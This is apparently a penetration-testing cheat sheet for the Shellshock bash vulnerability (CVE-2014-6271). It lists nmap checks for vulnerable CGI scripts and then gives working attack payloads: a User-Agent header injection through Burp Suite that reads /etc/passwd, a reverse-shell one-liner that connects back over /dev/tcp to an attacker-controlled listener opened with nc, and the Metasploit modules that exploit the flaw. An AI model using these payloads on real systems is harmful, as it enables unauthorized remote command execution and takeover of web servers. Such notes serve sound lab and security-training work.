# Shellshock - CVE-2014-6271

This allows an attacker to run remote commands on the target  

Bash executes trailing commands after a series of characters -- () {:;};.  
You will need to locate an input vector or script that allows you to communicate with bash

### Checking if it is vulnerable
1. Enumerate site with nmap
2. Verify if there is a webpage running
3. Load page in browser
4. Check for any movement (this may tell you if there is a cgi script running)
5. Check page source for .cgi files
6. Verify is script is available in root of web server.
   - **Example** http://(IP address)/gettime.cgi
7. Verify if it is vulnerable - ```nmap -sV (IP address) --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"```

### Manual exploitation
1. Launch BurpSuite
2. Enable FoxyProxy
3. Re-load the page with the CGI script
4. Send request to Repeater
5. Remove User-agent information
6. Replace it with our characters -- ```() {:;}; echo; echo; /bin/bash -c 'cat /etc/passwd'.```

**Getting a reverse shell**  
1. setup listener -- ```nc -lvnp 1234```
2. In Burpsuite, in Repeater -- ``````() {:;}; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/(your IP address)/1234 0>1'```
3. 
### Automated Exploitaion

1. Launch Metasploit
2. Modules:
   - auxiliary/scanner/http/apache_mod_cgi_bash_env -- Tells you if its vulnerable
   - exploit/multi/http/apache_mod_cgi_bash_env_exec -- The exploit
